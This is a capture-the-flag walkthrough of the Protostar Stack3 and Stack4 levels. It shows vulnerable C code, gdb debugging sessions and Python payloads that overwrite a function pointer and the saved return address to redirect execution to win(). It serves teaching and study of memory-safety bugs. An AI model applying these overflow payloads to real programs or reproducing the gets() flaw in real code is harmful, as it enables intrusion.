#### 13. Buffer Overflows can Redirect Program Execution

###### Stack3

- `Stack3` looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

- Hints
	- Both `gdb` and `objdump` is your friend you determining where the `win()` function lies in memory.

- This level is at `/opt/protostar/bin/stack3`

`stack3.c`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./stack3 -q
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) set disassembly-flavor intel
(gdb) x win
0x8048424 <win>:	0x83e58955
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave
0x08048478 <main+64>:	ret
End of assembler dump.
(gdb) break *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r
Starting program: /opt/protostar/bin/stack3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
calling function pointer, jumping to 0x41414141

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff7f4) at stack3/stack3.c:22
22	stack3/stack3.c: No such file or directory.
	in stack3/stack3.c
(gdb) info registers
eax            0x41414141	1094795585
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff6e0	0xbffff6e0
ebp            0xbffff748	0xbffff748
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200296	[ PF AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) q
A debugging session is active.

	Inferior 1 [process 2124] will be killed.

Quit anyway? (y or n) y
user@protostar:/opt/protostar/bin$
```

`/tmp/s3exp.py`

```python
print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
```

```sh
user@protostar:/opt/protostar/bin$ python /tmp/s3exp.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python /tmp/s3exp.py > /tmp/exp3
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./stack3 -q
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave
0x08048478 <main+64>:	ret
End of assembler dump.
(gdb) break *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r < /tmp/exp3
Starting program: /opt/protostar/bin/stack3 < /tmp/exp3
calling function pointer, jumping to 0x51515151

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff7f4) at stack3/stack3.c:22
22	stack3/stack3.c: No such file or directory.
	in stack3/stack3.c
(gdb) info registers
eax            0x51515151	1364283729
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff6e0	0xbffff6e0
ebp            0xbffff748	0xbffff748
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200296	[ PF AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

```sh
>>> chr(0x51)
'Q'
>>>
```

`/tmp/s3exp.py`

```python
print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP" + "\x24\x84\x04\x08" # 0x8048424
```

```sh
user@protostar:/opt/protostar/bin$ python /tmp/s3exp.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP$�
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python /tmp/s3exp.py > /tmp/exp3
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./stack3 -q
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave
0x08048478 <main+64>:	ret
End of assembler dump.
(gdb) break *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r < /tmp/exp3
Starting program: /opt/protostar/bin/stack3 < /tmp/exp3
calling function pointer, jumping to 0x08048424

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff7f4) at stack3/stack3.c:22
22	stack3/stack3.c: No such file or directory.
	in stack3/stack3.c
(gdb) info registers
eax            0x8048424	134513700
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff6e0	0xbffff6e0
ebp            0xbffff748	0xbffff748
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200296	[ PF AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) c
Continuing.
code flow successfully changed

Program exited with code 037.
(gdb) q
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'A'*68" | ./stack3
calling function pointer, jumping to 0x41414141
Segmentation fault
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'A'*64 +'\x24\x84\x04\x08'" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:/opt/protostar/bin$
```

###### Stack4

`Stack4` takes a look at overwriting saved EIP and standard buffer overflows.

This level is at `/opt/protostar/bin/stack4`

- Hints
	- A variety of introductory papers into buffer overflows may help.
	- `gdb` lets you do `run < input`
	- `EIP` is not directly after the end of buffer, compiler padding can also increase the size.

`stack4.c`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

```sh
user@protostar:/opt/protostar/bin$ ./stack4
sdfsdgdfgd
user@protostar:/opt/protostar/bin$
```

`/tmp/s4exp.py`

```python
print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
```

```sh
user@protostar:/opt/protostar/bin$ python /tmp/s4exp.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python /tmp/s4exp.py > /tmp/exp
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./stack4 -q
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   ebp
0x08048409 <main+1>:	mov    ebp,esp
0x0804840b <main+3>:	and    esp,0xfffffff0
0x0804840e <main+6>:	sub    esp,0x50
0x08048411 <main+9>:	lea    eax,[esp+0x10]
0x08048415 <main+13>:	mov    DWORD PTR [esp],eax
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave
0x0804841e <main+22>:	ret
End of assembler dump.
(gdb) r < /tmp/exp
Starting program: /opt/protostar/bin/stack4 < /tmp/exp

Program received signal SIGSEGV, Segmentation fault.
0x54545454 in ?? ()
(gdb) info registers
eax            0xbffff700	-1073744128
ecx            0xbffff700	-1073744128
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff750	0xbffff750
ebp            0x53535353	0x53535353
esi            0x0	0
edi            0x0	0
eip            0x54545454	0x54545454
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

```sh
>>> chr(0x53)
'S'
>>>
>>> chr(0x54)
'T'
>>>
```

```sh
user@protostar:/opt/protostar/bin$ objdump -M intel -d stack4 | grep win
080483f4 <win>:
user@protostar:/opt/protostar/bin$
```

`/tmp/s4exp.py`

```python
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
ebp = "SSSS"
eip = struct.pack('I', 0x080483f4)

print padding + ebp + eip
```

```sh
user@protostar:/opt/protostar/bin$ python /tmp/s4exp.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS�
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python /tmp/s4exp.py > /tmp/exp
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./stack4 -q
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   ebp
0x08048409 <main+1>:	mov    ebp,esp
0x0804840b <main+3>:	and    esp,0xfffffff0
0x0804840e <main+6>:	sub    esp,0x50
0x08048411 <main+9>:	lea    eax,[esp+0x10]
0x08048415 <main+13>:	mov    DWORD PTR [esp],eax
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave
0x0804841e <main+22>:	ret
End of assembler dump.
(gdb) r < /tmp/exp
Starting program: /opt/protostar/bin/stack4 < /tmp/exp
code flow successfully changed

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) info registers
eax            0x1f	31
ecx            0xb7fd84c0	-1208122176
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff754	0xbffff754
ebp            0x53535353	0x53535353
esi            0x0	0
edi            0x0	0
eip            0x0	0
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

```sh
user@protostar:/opt/protostar/bin$ python /tmp/s4exp.py | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$
```